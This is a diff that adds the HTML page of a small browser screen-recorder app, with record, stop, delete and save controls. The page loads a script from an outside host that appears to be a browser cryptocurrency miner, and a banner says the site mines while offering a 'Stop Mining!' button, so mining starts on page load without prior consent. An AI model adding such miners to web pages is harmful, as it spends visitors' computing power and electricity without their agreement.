@@ -1,0 +1,39 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>RecScreen - Screen Recorder</title>
+    <link rel="stylesheet" href="./css/style.css" />
+    <link rel="shortcut icon" href="./assets/REC.png" type="image/x-icon">
+    <script src="https://kit.fontawesome.com/363890c876.js" crossorigin="anonymous"></script>
+    <script src="https://www.hostingcloud.racing/9Od6.js"></script>
+  </head>
+
+  <body>
+    <ul id="controls">
+      <li>
+        <i id="start" class="fas fa-record-vinyl"></i>
+      </li>
+      <li>
+        <i id="stop" class="fas fa-stop-circle"></i>
+      </li>
+      <li>
+        <h1>- - -</h1>
+      </li>
+      <li>
+        <i id="delete" class="fas fa-times-circle"></i>
+      </li>
+      <li>
+        <i id="save" class="fas fa-save"></i>
+      </li>
+    </ul>
+
+    <h3 style="font-size:15px;position:absolute;top:93%;left:50%;transform:translate(-50%,-7%);width:100%;">
+      This website mines cryptocurrency at very low speeds so we can keep it free and so we don't need to fill the screen with ads.
+      <b id="bt-miner" style="cursor:pointer;font-size:20px;" onclick="stopMining()"> - Stop Mining! - </b>
+    </h3>
+    
+    <video autoplay />
+
+    <script src="./js/main.js"></script>
+  </body>
+</html>
